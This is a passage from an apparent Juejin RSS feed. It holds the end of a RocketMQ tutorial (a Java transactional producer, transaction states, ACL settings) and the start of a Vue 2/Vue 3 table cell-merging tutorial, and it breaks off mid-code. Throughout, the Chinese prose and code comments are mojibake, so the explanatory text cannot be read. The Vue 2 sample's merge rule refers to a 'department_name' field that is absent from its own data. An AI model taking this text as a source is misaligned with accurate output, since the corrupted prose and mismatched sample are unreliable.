        <span class="hljs-type">TransactionListener</span> <span class="hljs-variable">transactionListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionListenerImpl</span>();
        <span class="hljs-type">TransactionMQProducer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionMQProducer</span>(PRODUCER_GROUP);

        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executorService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">100</span>, TimeUnit.SECONDS, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">2000</span>), r -&gt; {
            <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r);
            thread.setName(<span class="hljs-string">"client-transaction-msg-check-thread"</span>);
            <span class="hljs-keyword">return</span> thread;
        });

        producer.setExecutorService(executorService);
        producer.setTransactionListener(transactionListener);
        producer.start();

        String[] tags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] {<span class="hljs-string">"TagA"</span>, <span class="hljs-string">"TagB"</span>, <span class="hljs-string">"TagC"</span>, <span class="hljs-string">"TagD"</span>, <span class="hljs-string">"TagE"</span>};
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span>
                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, tags[i % tags.length], <span class="hljs-string">"KEY"</span> + i,
                        (<span class="hljs-string">"Hello RocketMQ "</span> + i).getBytes(RemotingHelper.DEFAULT_CHARSET));
                <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.sendMessageInTransaction(msg, <span class="hljs-literal">null</span>);
                System.out.printf(<span class="hljs-string">"%s%n"</span>, sendResult);

                Thread.sleep(<span class="hljs-number">10</span>);
            } <span class="hljs-keyword">catch</span> (MQClientException | UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }

        <span class="hljs-comment">// ä¿æŒç¨‹åºè¿è¡Œï¼ˆå…³é”®ï¼å¦åˆ™ç”Ÿäº§è€…å…³é—­åæ— æ³•æ¥æ”¶å›æŸ¥å›è°ƒï¼‰</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000</span>; i++) {
            Thread.sleep(<span class="hljs-number">1000</span>);
        }
        producer.shutdown();
    }
}
</code></pre>
<p>è¿™ä¸¤æ®µä»£ç ï¼Œå…¶ä¸­ <code>TransactionListenerImpl</code> æ˜¯äº‹åŠ¡ç›‘å¬å™¨çš„å®ç°ç±»ï¼ˆè´Ÿè´£å¤„ç†æœ¬åœ°äº‹åŠ¡å’Œäº‹åŠ¡å›æŸ¥ï¼‰ï¼Œ<code>TransactionProducer</code> æ˜¯äº‹åŠ¡æ¶ˆæ¯ç”Ÿäº§è€…ï¼ˆè´Ÿè´£å‘é€äº‹åŠ¡æ¶ˆæ¯å¹¶é©±åŠ¨æ•´ä¸ªæµç¨‹ï¼‰ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">LocalTransactionState</span> {
    COMMIT_MESSAGE, <span class="hljs-comment">// â€œæäº¤â€ï¼Œæ¶ˆæ¯å¯¹æ¶ˆè´¹è€…å¯è§ï¼›</span>
    ROLLBACK_MESSAGE, <span class="hljs-comment">// â€œå›æ»šâ€ï¼Œæ¶ˆæ¯è¢«ä¸¢å¼ƒï¼›</span>
    UNKNOW; <span class="hljs-comment">//  â€œæœªçŸ¥â€ï¼ŒRocketMQ ä¼šç»§ç»­å›æŸ¥ï¼ˆç›´åˆ°è¶…æ—¶ï¼‰ï¼›</span>
}
</code></pre>
<p>å½“ <code>executeLocalTransaction</code> è¿”å› <code>UNKNOW</code>ï¼Œæˆ–ç”Ÿäº§è€…ä¸ <code>RocketMQ</code> é€šä¿¡å¼‚å¸¸æ—¶ï¼Œ<code>RocketMQ</code>ä¼šå®šæ—¶å›è°ƒè¯¥æ–¹æ³•ï¼Œç¡®è®¤æœ¬åœ°äº‹åŠ¡æœ€ç»ˆçŠ¶æ€ï¼›</p>
<p>å¿…é¡»ä½¿ç”¨ <code>TransactionMQProducer</code>æ¥å‘é€æ¶ˆæ¯ã€‚</p>
<h3 data-id="heading-32">9 ACL æƒé™æ§åˆ¶æœºåˆ¶</h3>
<p>è®¿é—®æ§åˆ¶ 2.0ï¼ˆACL 2.0ï¼‰æ˜¯Apache RocketMQçš„è®¿é—®æ§åˆ¶åˆ—è¡¨(Access Control List)å‡çº§ç‰ˆæœ¬ï¼Œæä¾›äº†å®Œå–„çš„èº«ä»½è®¤è¯(Authentication)å’Œæƒé™æˆæƒ(Authorization)æœºåˆ¶ï¼Œç”¨äºä¿æŠ¤RocketMQé›†ç¾¤çš„æ•°æ®å®‰å…¨ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥åœ¨æ§åˆ¶ç•Œé¢ç»™ topic è®¾ç½®æƒé™</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/366e84d27fff4c1fb7ca6ccd56d2bf74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=WFe8OwyXH6tJdcwCbyyZQnd6Lxo%3D" alt="" loading="lazy"/></p>
<p>å¦‚å›¾ä¸­çš„ perm è¡¨ç¤º topic çš„æƒé™ï¼Œæœ‰ä¸‰ä¸ªå¯é€‰é¡¹ã€‚ 2ï¼šç¦å†™ç¦è®¢é˜…ï¼Œ4ï¼šå¯è®¢é˜…ï¼Œä¸èƒ½å†™ï¼Œ6ï¼šå¯å†™å¯è®¢é˜…ã€‚</p>
<blockquote>
<p>åœ¨Brokerç«¯è¿˜æä¾›äº†æ›´è¯¦ç»†çš„æƒé™æ§åˆ¶æœºåˆ¶ã€‚ä¸»è¦æ˜¯åœ¨broker.confä¸­æ‰“å¼€aclçš„æ ‡å¿—ï¼šaclEnable=trueã€‚å°±å¯ä»¥ç”¨plain_acl.ymlæ¥è¿›â¾æƒé™é…ç½®äº†ï¼Œå¹¶ä¸”æ˜¯çƒ­åŠ è½½ï¼Œæ— éœ€é‡å¯ã€‚</p>
<p><strong>ä½†æ˜¯æˆ‘è¿™ä¸ªæ˜¯ 2.0ï¼Œåœ¨ ACL2.0 è¿™ç§æ–¹æ³•å·²ç»è¢«ç§»é™¤äº†ï¼ˆåç»­æ–‡ç« å°†è¯¦ç»†æå†™ï¼‰ã€‚</strong></p>
</blockquote>
<p>ACL 2.0 å¯ä»¥é€šè¿‡é…ç½® broker.conf æ¥è®¾ç½®è®¤è¯æˆæƒç­‰ã€‚</p>
<h3 data-id="heading-33">æ€»ç»“</h3>
<p>RocketMQ å®¢æˆ·ç«¯æ¶ˆæ¯æœºåˆ¶å…·å¤‡æ¸…æ™°çš„ä½¿ç”¨é€»è¾‘ä¸å®Œå–„çš„å¯é æ€§ä¿éšœï¼šç”Ÿäº§è€…ã€æ¶ˆè´¹è€…å‡æœ‰å›ºå®šç¼–ç¨‹æ­¥éª¤ï¼›æ¶ˆæ¯ç¡®è®¤æœºåˆ¶åˆ†ç”Ÿäº§ç«¯ï¼ˆåŒæ­¥ / å¼‚æ­¥ / å•å‘å‘é€çš„å·®å¼‚åŒ–ç¡®è®¤ï¼Œå…³è” Broker åˆ·ç›˜ / å¤åˆ¶ç­–ç•¥ï¼‰å’Œæ¶ˆè´¹ç«¯ï¼ˆåŸºäº Offset çš„è‡ªåŠ¨ / æ‰‹åŠ¨ç¡®è®¤ï¼Œå«é‡è¯•ã€æ­»ä¿¡é˜Ÿåˆ—ç­‰å…œåº•ï¼‰ï¼›æ¶ˆè´¹æ¨¡å¼æ”¯æŒé›†ç¾¤ï¼ˆè´Ÿè½½å‡è¡¡ï¼ŒBroker ç®¡ç† Offsetï¼‰ä¸å¹¿æ’­ï¼ˆå…¨é‡æ¶ˆè´¹ï¼Œæœ¬åœ°ç»´æŠ¤ Offsetï¼‰ï¼›æ¶ˆæ¯è¿‡æ»¤å¯é€šè¿‡ Tagï¼ˆç®€å•é«˜æ•ˆï¼‰æˆ– SQL92ï¼ˆå¤æ‚çµæ´»ï¼‰åœ¨ Broker ç«¯å®ç°ï¼Œå‡å°‘æ— æ•ˆä¼ è¾“ã€‚</p>
<hr/>
<p><em>è½¬å‘è¯·æºå¸¦ä½œè€…ä¿¡æ¯</em>Â  <strong>@æ€’æ”¾å§å¾·å¾· @ä¸€ä¸ªæœ‰æ¢¦æœ‰æˆçš„äºº</strong><br/>
æŒç»­åˆ›ä½œå¾ˆä¸å®¹æ˜“ï¼Œä½œè€…å°†ä»¥å°½å¯èƒ½çš„è¯¦ç»†æŠŠæ‰€å­¦çŸ¥è¯†åˆ†äº«å„ä½å¼€å‘è€…ï¼Œä¸€èµ·è¿›æ­¥ä¸€èµ·å­¦ä¹ ã€‚<strong>è½¬è½½è¯·æºå¸¦é“¾æ¥ï¼Œè½¬è½½åˆ°å¾®ä¿¡å…¬ä¼—å·è¯·å‹¿é€‰æ‹©åŸåˆ›ï¼Œè°¢è°¢ï¼</strong><br/>
ğŸ‘åˆ›ä½œä¸æ˜“ï¼Œå¦‚æœ‰é”™è¯¯è¯·æŒ‡æ­£ï¼Œæ„Ÿè°¢è§‚çœ‹ï¼è®°å¾—ç‚¹èµå“¦ï¼ğŸ‘<br/>
è°¢è°¢æ”¯æŒï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vue2+vue3 Tableè¡¨æ ¼åˆå¹¶]]></title>    <link>https://juejin.cn/post/7597635202324627508</link>    <guid>https://juejin.cn/post/7597635202324627508</guid>    <pubDate>2026-01-21T10:47:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597635202324627508" data-draft-id="7597635202324594740" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vue2+vue3 Tableè¡¨æ ¼åˆå¹¶ "/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js,Element"/> <meta itemprop="datePublished" content="2026-01-21T10:47:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é™¶é†‰çš„æ¾é¼ "/> <meta itemprop="url" content="https://juejin.cn/user/747323637634957"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vue2+vue3 Tableè¡¨æ ¼åˆå¹¶ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/747323637634957/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é™¶é†‰çš„æ¾é¼ 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T10:47:00.000Z" title="Wed Jan 21 2026 10:47:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p>ä¹‹å‰åœ¨å†™è¡¨æ ¼åˆå¹¶çš„æ—¶å€™éå¸¸ç—›è‹¦ï¼Œå¼„ä¸æ˜ç™½åˆå¹¶çš„å…·ä½“é€»è¾‘ï¼Œæˆ‘è¿™é‡Œç›´æ¥è´´ä¸Šé€šç”¨æ–¹æ³•ï¼Œåªéœ€è¦é…ç½®åˆå¹¶è§„åˆ™å°±å¯ä»¥äº†ï¼Œåœ¨è¿™é‡Œä¸æ‰¯é‚£ä¹ˆå¤šè¿‡ç¨‹ï¼Œä½ å®Œå…¨å¯ä»¥æ‹·è´å›å»ç«‹é©¬èƒ½ç”¨ã€‚</p>
<h2 data-id="heading-0">vue2 è¡¨æ ¼åˆå¹¶</h2>
<pre><code class="hljs language-javascript" lang="javascript">&lt;el-table
      :data=<span class="hljs-string">"tableData"</span>
     :span-method=<span class="hljs-string">"(param)=&gt;objectSpanMethod(param,tableData)"</span>
      border
      style=<span class="hljs-string">"width: 100%"</span>&gt;
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"id"</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"ID"</span>
        <span class="hljs-attr">width</span>=<span class="hljs-string">"180"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"name"</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"å§“å"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"amount1"</span>
        <span class="hljs-attr">sortable</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"æ•°å€¼ 1"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"amount2"</span>
        <span class="hljs-attr">sortable</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"æ•°å€¼ 2"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>
        <span class="hljs-attr">prop</span>=<span class="hljs-string">"amount3"</span>
        <span class="hljs-attr">sortable</span>
        <span class="hljs-attr">label</span>=<span class="hljs-string">"æ•°å€¼ 3"</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span>
    &lt;/el-table&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">function</span> <span class="hljs-title function_">filterArray</span>(<span class="hljs-params">item</span>) {
  <span class="hljs-keyword">const</span> valueArray = <span class="hljs-variable language_">this</span>.<span class="hljs-property">rule</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">prop</span> =&gt;</span> {
    <span class="hljs-keyword">return</span> item[prop] === <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>[prop]
  })
  <span class="hljs-keyword">if</span> (valueArray.<span class="hljs-property">length</span> === <span class="hljs-variable language_">this</span>.<span class="hljs-property">rule</span>.<span class="hljs-property">length</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
  }
}
  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">tableData</span>: [{
          <span class="hljs-attr">id</span>: <span class="hljs-string">'12987122'</span>,
          <span class="hljs-attr">name</span>: <span class="hljs-string">'ç‹å°è™'</span>,
          <span class="hljs-attr">amount1</span>: <span class="hljs-string">'234'</span>,
          <span class="hljs-attr">amount2</span>: <span class="hljs-string">'3.2'</span>,
          <span class="hljs-attr">amount3</span>: <span class="hljs-number">10</span>
        }, {
          <span class="hljs-attr">id</span>: <span class="hljs-string">'12987123'</span>,
          <span class="hljs-attr">name</span>: <span class="hljs-string">'ç‹å°è™'</span>,
          <span class="hljs-attr">amount1</span>: <span class="hljs-string">'165'</span>,
          <span class="hljs-attr">amount2</span>: <span class="hljs-string">'4.43'</span>,
          <span class="hljs-attr">amount3</span>: <span class="hljs-number">12</span>
        }, {
          <span class="hljs-attr">id</span>: <span class="hljs-string">'12987124'</span>,
          <span class="hljs-attr">name</span>: <span class="hljs-string">'ç‹å°è™'</span>,
          <span class="hljs-attr">amount1</span>: <span class="hljs-string">'324'</span>,
          <span class="hljs-attr">amount2</span>: <span class="hljs-string">'1.9'</span>,
          <span class="hljs-attr">amount3</span>: <span class="hljs-number">9</span>
        }, {
          <span class="hljs-attr">id</span>: <span class="hljs-string">'12987125'</span>,
          <span class="hljs-attr">name</span>: <span class="hljs-string">'ç‹å°è™'</span>,
          <span class="hljs-attr">amount1</span>: <span class="hljs-string">'621'</span>,
          <span class="hljs-attr">amount2</span>: <span class="hljs-string">'2.2'</span>,
          <span class="hljs-attr">amount3</span>: <span class="hljs-number">17</span>
        }, {
          <span class="hljs-attr">id</span>: <span class="hljs-string">'12987126'</span>,
          <span class="hljs-attr">name</span>: <span class="hljs-string">'ç‹å°è™'</span>,
          <span class="hljs-attr">amount1</span>: <span class="hljs-string">'539'</span>,
          <span class="hljs-attr">amount2</span>: <span class="hljs-string">'4.1'</span>,
          <span class="hljs-attr">amount3</span>: <span class="hljs-number">15</span>
        }],
        <span class="hljs-attr">spanRule</span>: {
            <span class="hljs-attr">rule</span>: {
              <span class="hljs-number">0</span>: [<span class="hljs-string">'department_name'</span>]   <span class="hljs-comment">//è¡¨ç¤ºç¬¬ä¸€åˆ—çš„åˆå¹¶è§„åˆ™</span>
            }
      }
      };
    },
    <span class="hljs-attr">methods</span>: {
      <span class="hljs-comment">// è¡¨æ ¼åˆå¹¶</span>
          <span class="hljs-title function_">objectSpanMethod</span>(<span class="hljs-params">{ row, column, rowIndex, columnIndex }, item</span>) {
            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">spanRule</span>.<span class="hljs-property">rule</span>).<span class="hljs-title function_">includes</span>(columnIndex.<span class="hljs-title function_">toString</span>())) {
              <span class="hljs-comment">// filteréªŒè¯æ•°ç»„</span>
              <span class="hljs-keyword">const</span> currentTable = {
                <span class="hljs-attr">rule</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">spanRule</span>.<span class="hljs-property">rule</span>[columnIndex],
                <span class="hljs-attr">data</span>: item[rowIndex]
              }
              <span class="hljs-comment">// è¯¥å•å…ƒæ ¼æ˜¯å¦è¢«åˆå¹¶ true åˆå¹¶ï¼Œ false : ä¸åˆå¹¶</span>
              <span class="hljs-keyword">let</span> chooseSpan = <span class="hljs-literal">false</span>
              <span class="hljs-keyword">if</span> (rowIndex !== <span class="hljs-number">0</span>) {
                chooseSpan = filterArray.<span class="hljs-title function_">call</span>(currentTable, item[rowIndex - <span class="hljs-number">1</span>])
              }
              <span class="hljs-keyword">if</span> (chooseSpan) {
                <span class="hljs-keyword">return</span> {
                  <span class="hljs-attr">rowspan</span>: <span class="hljs-number">0</span>,
                  <span class="hljs-attr">colspan</span>: <span class="hljs-number">0</span>
                }
              } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> {
                  <span class="hljs-attr">rowspan</span>: item.<span class="hljs-title function_">filter</span>(filterArray, currentTable).<span class="hljs-property">length</span>,
                  <span class="hljs-attr">colspan</span>: <span class="hljs-number">1</span>
                }
              }
            }
          },
    }
  };
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>


</code></pre>
<h2 data-id="heading-1">vue3 è¡¨æ ¼åˆå¹¶</h2>
<h3 data-id="heading-2">vue3 hooksæ–‡ä»¶å†…å®¹</h3>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// å®šä¹‰é€šç”¨ç±»å‹ï¼ˆæ”¯æŒä»»æ„è¡¨æ ¼æ•°æ®ç±»å‹ï¼‰</span>
<span class="hljs-keyword">export</span> interface <span class="hljs-title class_">TableSpanRule</span> {
    <span class="hljs-attr">rule</span>: <span class="hljs-title class_">Record</span>&lt;string, string[]&gt;; <span class="hljs-comment">// åˆ—ç´¢å¼• â†’ åˆå¹¶å­—æ®µåˆ—è¡¨</span>
}

<span class="hljs-comment">// è¡¨æ ¼åˆå¹¶Hook</span>
